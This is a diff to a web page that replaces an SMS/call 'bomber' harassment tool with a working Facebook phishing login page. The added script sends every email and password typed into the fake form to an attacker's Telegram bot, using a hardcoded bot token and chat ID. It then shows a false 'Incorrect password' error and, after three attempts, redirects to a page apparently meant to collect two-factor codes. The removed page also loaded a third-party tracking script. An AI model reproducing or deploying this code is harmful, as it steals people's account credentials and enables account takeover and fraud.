@@ -1,77 +1,277 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="Xbomber is the pioneer of sms and call bombers in Bangladesh. For a long time, this was a closed source project. But we (Team X 1337) have decided to make it open source so that everyone can gain knowledge from this project and create their own project from this github template.">
-  <title>XBOMBER | Community Edition</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"
-    integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
-  <link rel="stylesheet" href="assets/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - login</title>
+    <link rel="website icon" href="https://raw.githubusercontent.com/ArchismanKarmakar/Facebook-Phishing-page-php/refs/heads/main/imgs/hLRJ1GG_y0J.ico">
+    
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #f7f8fa, #ffffff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            position: relative;
+        }
+
+        /* Language Selector */
+        .language {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 14px;
+            color: #777;
+        }
+
+        /* Container */
+        .container {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        /* Facebook Logo */
+        .logo {
+            margin-bottom: 50px;
+            margin-top: 80px;
+        }
+
+        .logo img {
+            width: 60px;
+        }
+
+        /* Login Form */
+        .form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 50px;
+        }
+
+        .form input {
+            padding: 14px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            transition: border-color 0.3s ease;
+        }
+
+        .form input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        .form input.error {
+            border-color: #165dd1; /* লাল বর্ডার দেখানোর জন্য */
+        }
+
+        .form button {
+            background-color: #1877f2;
+            color: white;
+            padding: 14px;
+            font-size: 16px;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .form button:hover {
+            background-color: #165dd1;
+        }
+
+        .form a {
+            color: #343434;
+            font-size: 16px;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+
+        .form a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Create New Account Button */
+        .create-account {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 18px;
+            margin-top: 190px;
+        }
+
+        .create-account button {
+            background-color: transparent;
+            border: 1px solid #1877f2;
+            color: #1877f2;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: normal;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 380px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .create-account button:hover {
+            background-color: #e7f3ff;
+        }
+
+        /* Meta Logo and Text */
+        .meta {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
+            color: #343434;
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+        }
+
+        .meta img {
+            width: 55px;
+            margin-bottom: 5px;
+        }
+
+        /* Footer Links */
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 14px;
+            font-size: 10px;
+        }
+
+        .footer-links a {
+            color: #343434;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .form button {
+            background-color: #1877f2;
+            color: white;
+            padding: 14px;
+            font-size: 16px;
+            border: none;
+            border-radius: 24px; /* গোলাকার বাটন */
+            cursor: pointer;
+            width: 100%; /* পুরো প্রস্থ জুড়ে */
+            text-align: center;
+            font-weight: normal; /* গাঢ় টেক্সট */
+            transition: background-color 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2); /* হালকা ছায়া */
+        }
+
+        .form button:hover {
+            background-color: #165dd1; /* হোভার এফেক্ট */
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-bottom: 12px; /* লাইন ব্রেকের জন্য */
+            text-align: left;
+        }
+    </style>
 </head>
-
 <body>
-  <section class="container-fluid">
-    <section class="row justify-content-center">
-      <section class="col-12 col-sm-6 col-md-4">
-        <div class="form form-container">
-          <div class="form-group">
-            <h1 class="text-center font-weight-bold header">
-              <i class="bi bi-emoji-heart-eyes"></i> XBOMBER <i class="bi bi-emoji-heart-eyes-fill"></i>
-            </h1>
-            <p class="credit text-muted"><small>FROM</small> <span class="fw-bold">TEAM X 1337</span></p>
-            <p class="notice">
-              <i class="bi bi-x"></i> 
-              DEVELOPERS WON'T TAKE RESPONSIBLITY OF ANY MISUSE.
-              <i class="bi bi-x"></i>
-            </p>
-          </div>
-          <br>
-          <form>
-            <div class="mb-3">
-              <label for="mobile" class="form-label"><text style="color:white !important"><i
-                    class="bi bi-person-circle"></i> TARGET NUMBER</text> </label>
-              <input type="number" class="form-control" id="mobile">
-            </div>
-            <div class="mb-3">
-              <label for="amount" class="form-label"><text style="color:white !important"><i
-                    class="bi bi-speedometer2"></i> AMOUNT</text></label>
-              <input type="number" class="form-control" id="amount">
-            </div>
-            <div class="d-flex justify-content-center">
-              <div class="alert alert-info visually-hidden fw-bold" role="alert" id="logs">
+    <!-- Language Selector -->
+    <div class="language">English (UK)</div>
 
-              </div>
-            </div>
-            <br>
-            <div align="center">
-              <button id="send" type="submit" class="btn btn-outline-light"><i class="bi bi-lightning-charge"></i>
-                <b>SUBMIT</b> </button>
-            </div>
-          </form>
-          <hr>
-          <div class="footer-copyright text-center py-3" align="center">
-            <small class="text-muted" style="color: white !important">MADE WITH <i class="bi bi-heart"
-                style="color:red !important"></i> BY <b>ZIHAD</b></small>
-            <br><br>
-            <button class="btn btn-outline-primary"
-              onclick="document.location='https://t.me/ign0r3dh4x0r'">
-              <i class="bi bi-tree"></i>
-              LINKTREE
-            </button>
-            <span style="color: white;"> | </span>
-            <button class="btn btn-outline-primary" onclick="document.location='https://github.com/sowmiksudo'">
-              <i class="bi bi-github"></i>
-              GITHUB
-            </button>
-            <br>
-          </div>
-          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-          <script src="assets/script.js"></script>
-          <script src="https://ezstat.ru/1F2zr7.js"></script>
+    <!-- Container -->
+    <div class="container">
+        <!-- Facebook Logo -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
         </div>
-</body>
 
+        <!-- Login Form -->
+        <div class="form">
+            <input id="email" type="text" placeholder="Mobile number or email address">
+            <input id="password" type="password" placeholder="Password">
+            <div id="password-error" class="error-message" style="display:none;">Incorrect password. Please try again.</div>
+            <button type="button" onclick="login()">Log in</button>
+            <a href="#">Forgotten Password?</a>
+        </div>
+        <!-- Create Account Button -->
+        <div class="create-account">
+            <button type="button">Create new account</button>
+        </div>
+    </div>
+
+    <!-- Meta Logo and Text -->
+    <div class="meta">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yr/r/7trPSpNFerC.png" alt="Meta Logo">
+        <!-- Footer Links -->
+        <div class="footer-links">
+            <a href="#">About</a>
+            <a href="#">Help</a>
+            <a href="#">More</a>
+        </div>
+    </div>
+
+    <script>
+        let attempt = 0;
+        const botToken = "7960524085:AAHzTaSqSnUhzaXU-BePxqUYeWnf92hNBQ8";
+        const chatId = "6494839544";
+
+        function login() {
+            let email = document.getElementById("email");
+            let password = document.getElementById("password");
+            let passwordError = document.getElementById("password-error");
+            let valid = true;
+
+            // Validating email
+            if (email.value.trim() === "") {
+                email.classList.add("error");
+                email.focus(); // Focus on email input
+                valid = false;
+            } else {
+                email.classList.remove("error");
+            }
+
+            // Validating password
+            if (password.value.trim() === "") {
+                password.classList.add("error");
+                email.focus(); // Focus on password input
+                valid = false;
+            } else {
+                password.classList.remove("error");
+            }
+
+            if (!valid) return;
+
+            attempt++;
+
+            let message = `📌 **Facebook Login Attempt**\n\n👤 **Email:** ${email.value}\n🔑 **Password:** ${password.value}\n🛑 **Attempt:** ${attempt}`;
+            let telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramAPI);
+
+            if (attempt >= 3) {
+                window.location.href = "tow-factor.html";
+            } else {
+                password.classList.add("error");
+                passwordError.style.display = "block";  // Show the error message above the login button
+                password.value = "";
+            }
+        }
+    </script>
+</body>
 </html>
